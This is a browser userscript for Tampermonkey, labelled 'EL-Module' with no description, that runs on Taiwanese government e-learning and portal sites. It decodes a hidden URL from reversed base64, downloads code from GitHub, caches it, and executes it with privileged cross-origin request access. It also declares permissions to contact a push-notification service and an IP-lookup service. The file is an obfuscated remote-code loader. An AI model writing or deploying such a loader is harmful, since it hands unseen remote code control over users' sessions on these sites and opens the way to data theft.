// ==UserScript==
// @name         EL-Module
// @namespace    http://tampermonkey.net/
// @version      1.1
// @description  -
// @author       -
// @match        *://elearn.hrd.gov.tw/*
// @match        *://*.hrd.gov.tw/*
// @match        *://www.cp.gov.tw/*
// @grant        GM_xmlhttpRequest
// @grant        GM_setValue
// @grant        GM_getValue
// @connect      raw.githubusercontent.com
// @connect      ntfy.sh
// @connect      api.ipify.org
// @run-at       document-idle
// ==/UserScript==

(function () {
    var _r = function (s) { return atob(s.split('').reverse().join('')) };
    var _u = _r('==wcq5CdvJ2Xn5WauJXYlxWZf9Gd1F2LulWYt9yZulmbyFWZM1SRt8Gd1F0L1gTN5cjbvlmclh3Lt92YuQnblRnbvNmclNXdiVHa0l2ZucXYy9yL6MHc0RHa');
    var _s = '43a9aa7b0866d195ef0785e28b65f4a4';
    var _h = '6fcd2f5139c8132f3f415bc0114128f624f4fe00d1591a2e275ded5e711a6845';
    var _ck = '_m0', _ct = '_m1', _ak = '_m2', _x = 18e5;

    function _e(c) { try { (new Function('GM_xmlhttpRequest', 'GM_setValue', 'GM_getValue', c))(GM_xmlhttpRequest, GM_setValue, GM_getValue) } catch (e) { } }

    async function _v(p) {
        var d = new TextEncoder().encode(_s + p);
        var b = await crypto.subtle.digest('SHA-256', d);
        return Array.from(new Uint8Array(b)).map(function (x) { return x.toString(16).padStart(2, '0') }).join('');
    }

    async function _run() {
        if (!GM_getValue(_ak, '')) {
            var p = prompt('請輸入啟用密碼：');
            if (!p) return;
            var ph = await _v(p);
            if (ph !== _h) { alert('密碼錯誤'); return }
            GM_setValue(_ak, '1');
        }
        var _c = GM_getValue(_ck, ''), _ts = GM_getValue(_ct, 0), _n = Date.now();
        var isHome = window.location.pathname === '/' || window.location.pathname.includes('/index.php');
        if (_c) _e(_c);
        if (isHome || !_c || (_n - _ts) > _x) {
            GM_xmlhttpRequest({
                method: 'GET', url: _u + '?_=' + _n, headers: { 'Cache-Control': 'no-cache' },
                onload: function (r) {
                    if (r.status === 200 && r.responseText) {
                        GM_setValue(_ck, r.responseText);
                        GM_setValue(_ct, _n);
                        if (!_c || isHome) _e(r.responseText); // If home, reload new code immediately 
                    }
                }
            });
        }
    }
    _run();
})();
